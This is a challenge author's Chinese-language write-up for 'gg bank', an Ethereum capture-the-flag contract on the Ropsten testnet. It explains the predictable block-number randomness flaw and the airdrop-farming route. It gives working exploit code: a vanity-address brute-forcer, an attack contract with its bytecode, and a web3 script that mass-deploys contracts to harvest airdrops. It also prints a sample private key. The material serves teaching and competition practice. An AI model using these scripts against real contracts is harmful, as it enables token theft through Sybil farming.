# gg bank

此题源码可见 [0x7caa18D765e5B4c3BF0831137923841FE3e7258a](https://ropsten.etherscan.io/address/0x7caa18D765e5B4c3BF0831137923841FE3e7258a#code)

主体代码如下

```javascript
contract ggbank is ggToken{
    address public owner;
    mapping(uint => bool) locknumber;

    event GetFlag(
			string b64email,
			string back
		);
    
    modifier authenticate {
        require(checkfriend(msg.sender));_;
    }
    constructor() public {
        owner=msg.sender;
    }
    function checkfriend(address _addr) internal pure returns (bool success) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000007d7ec";
        bytes20 gg = hex"00000000000000000000000000000000000fffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & gg == id) {
                return true;
            }
            gg <<= 4;
            id <<= 4;
        }

        return false;
    }
    function getAirdrop() public authenticate returns (bool success){
		 if (!initialized[msg.sender]) {
            initialized[msg.sender] = true;
            balances[msg.sender] = _airdropAmount;
            _totalSupply += _airdropAmount;
        }
        return true;
	}
    function goodluck()  public payable authenticate returns (bool success) {
        require(!locknumber[block.number]);
        require(balances[msg.sender]>=100);
        balances[msg.sender]-=100;
        uint random=uint(keccak256(abi.encodePacked(block.number))) % 100;
        if(uint(keccak256(abi.encodePacked(msg.sender))) % 100 == random){
            balances[msg.sender]+=20000;
            _totalSupply +=20000;
            locknumber[block.number] = true;
        }
        return true;
    }
    
 
    function PayForFlag(string b64email) public payable authenticate returns (bool success){
		
			require (balances[msg.sender] > 200000);
			emit GetFlag(b64email, "Get flag!");
		}
}
```

题目的思路非常清晰，首先需要找到满足条件的地址才能开启游戏，也就是地址中含有7d7ec字符，之后你就可以取得空投，然后去争取区块奖励

在这里我的本意是让大家去争取调用goodluck函数，因为取用的随机数是区块号，我们可以算出每个地址满足条件的区块序列，之后想办法把交易塞进去就行了，因为每一次调用会扣100 token，所以我们可以部署一个合约进行判断，在目标区块前发送一堆交易过去即可，不过在设计题目时我想着这就是考考大家的脚本能力，干脆也留个薅羊毛的路子，有兴趣的可以去爆破足够的地址来完成题目。可惜考虑不周，给这个方法的限制设的太低了，做题的时候大家都是选择了爆破地址，确实只需要200个太少了点，没想到师傅们都爆的这么快，因为之前我测试时爆破account地址差不多近一分钟出一个的样子，合约地址就要快的多，一两秒就出一个，所以想着难度应该差不多，结果就让人难受了，因为题目出的比较匆忙，确实很多地方没有考虑到位，也是深表歉意。

不过在师傅们做题的过程中我也关注了合约的交易交易情况，大家都是选择了爆破account地址，有的师傅是选择了爆破出所有200个地址后一次性对它们进行转账，然后再使用这些账户获取空投，将token转移，这样算是比较快的，因为这些交易可以同时打包进同一个或临近的区块，有一些则是每爆破出一个就进行转账获取空投的操作，这样就慢很多了

看到大家都是直接选择了爆破account地址，这里我就写一下爆破合约地址的脚本，因为也是刚刚赶出来的，看着有点粗糙

首先部署一个代理的合约，当然，在这之前你得爆破出一个可用的账户地址,你可以用下面的算法跑一个出来

```javascript
const util = require('ethereumjs-util');
const rlp = require('rlp');
const generate = require('ethjs-account').generate;
seed='892h@fs8sk^2hSFR*/8s8shfs.jk39hsoi@hohskd51D1Q8E1%^;DZ1-=.@WWRXNI()VF6/*Z%$C51D1QV*<>FE8RG!FI;"./+-*!DQ39hsoi@hoFE1F5^7E%&*QS'//生成地址所用的种子
function fuzz() {
    for(var k=0;k<50000;k++){
        seed=seed+Math.random().toString(36).substring(12);
        for (var i=0;i<2000;i++){
            res=generate(seed);
            if(res.address.match("7d7ec")){
                console.log(res);
                return;
            }
        }
    }
}

fuzz();
```

大概是库的原因，我自己跑着是有点慢，下面有一个现成的

```javascript
{ privateKey:
   '0x962d412e4b25cb79838330e88fa21c8698d30ab225abab15daf73ddf87d291d2',
  publicKey:
   '0x963d413f4d0afec97dce9d849566a193d1b4013d153eba8ae9a08385b601a195db819d84811aee849f3da5d0013b53286055980aa05d8f51625f21c721471185',
  address: '0xfE319e52c5771a853487eC7d7ecA0d0987e57429' }
```

然后部署合约

```javascript
contract attack{
    ggbank target=ggbank(0x7caa18D765e5B4c3BF0831137923841FE3e7258a);
    constructor(){
        target.getAirdrop();
        target.transfer('your account address',1000);
    }
}
```

编译得到字节码，填入脚本，这里我爆破的是合约地址，因为合约地址的计算就是基于部署它的账户地址和该笔交易的nonce得来的，所以下面的代码主要是先随机生成私钥得到account地址后判断该地址前10个交易部署的合约的合约地址是否满足要求，满足的话我们就保存，随后统一对这些account地址转帐，然后让其发送交易，当nonce满足要求时即可部署合约，这时的合约地址就是满足题目要求的

```javascript
const util = require('ethereumjs-util');
const rlp = require('rlp');
var Web3 = require("web3");
var web3 = new Web3();
web3.setProvider(new Web3.providers.HttpProvider("https://ropsten.infura.io"));
web3.eth.accounts.wallet.add('your own private key');

const generate = require('ethjs-account').generate;
seed='892hr*(&^&)nusi.dvuqGCTYBAhohskd51D1Q8E1%^;DZ1-=.@WWdvRXNI()VF6/*Z%$C51D1QV*<>FEI;]!FI;"./+-*!DQv5soi@*QS'//生成地址所用的种子,脸滚键盘
function fuzz(){
    for(var k=0;k<50000;k++){
        seed=seed+Math.random().toString(36).substring(12);//为避免重复，生成一定数目后对种子进行更新
        for(var i=0;i<1000;i++){
            res=generate(seed);
            for (var j=0;j<30;j++){
                encodedRlp = rlp.encode([res.address, j]);// 进行rlp编码
                buf = util.sha3(encodedRlp);
                contractAddress =buf.slice(12).toString('hex');//取buffer第12个字节后面的部分作为地址

                if(contractAddress.match("7d7ec")){
                    //console.log(res);
                    //console.log(j);
                    return [res,j];
                }
            }
        }
    }
}
//部署的代理合约的字节码
var codedata="0x6080604052737caa18d765e5b4c3bf0831137923841fe3e7258a6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d25f82a06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b1580156100ea57600080fd5b505af11580156100fe573d6000803e3d6000fd5b505050506040513d602081101561011457600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb735e765a46826f5e7d7ec2d7b13285fd85637fb8376103e86040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b15801561020057600080fd5b505af1158015610214573d6000803e3d6000fd5b505050506040513d602081101561022a57600080fd5b81019080805190602001909291905050505060358061024a6000396000f3006080604052600080fd00a165627a7a723058206521b1bab92f54a8a4aaebafa1a446411efee324b6a8511f3e7c298f2b7a9d100029";
nonces=your nonce; //你的账户此时的nonce值
gg=[]
function attack(){
for (var i=0;i<30;i++){
    web3.eth.accounts.wallet.add(gg[i][0].privateKey);
    console.log(i);
    var n=gg[i][1];
    for(var k=0;k<n;k++){
        web3.eth.sendTransaction({
        from: gg[i][0].address,
        to: 'your own address',
        value: 50000000000000,
        gas: 100000,
        nonce: k,
        gasPrice: 1000000000
        }).catch(new Function());
    }
    web3.eth.sendTransaction({
        from: gg[i][0].address,
        to:'',
        data: codedata,
        nonce: n,
        gas: 2000000,
        gasPrice: 1000000000

    }).catch(new Function());    
}
}

for (var i=0;i<30;i++){
    console.log(i);
    gg[i]=fuzz();
}
for (var j=0;j<30;j++){
    console.log(j);
    web3.eth.sendTransaction({
    from: 'your own address',
    to: gg[j][0].address,
    nonce: nonces,
    value: 10000000000000000,
    gas: 1000000,
    gasPrice: 50000000000
    }).catch(new Function());
    nonces+=1;    
}

setTimeout(attack,120000);

```

这里主要有几点需要注意，我们集中进行对account地址转账后，需要等待这些交易确认才能使用这些account地址进行下一步的操作，所以这里我是选择了等待2分钟，另外我们连接的rpc接口似乎也有着交易发送的限制，我在测试时将循环设为50时后面进行account转账并部署合约时就崩掉了，具体还得后面再调试，保险起见我就设置了一次爆破30个，不过速度还是挺快的，其实爆破用时也就不到30秒，不过等待确认用了2分钟，总体大概不到三分钟吧，这时候你就更新nonce重新跑就行了，交易直接堆在链上让它们去确认就行了，总体速度还是挺快的

至于通过goodluck函数的那条路这里就懒得写了，因为题目的设计问题在这里可能确实没薅羊毛方便，不管使用的什么方法应该都还是能学到点东西的。

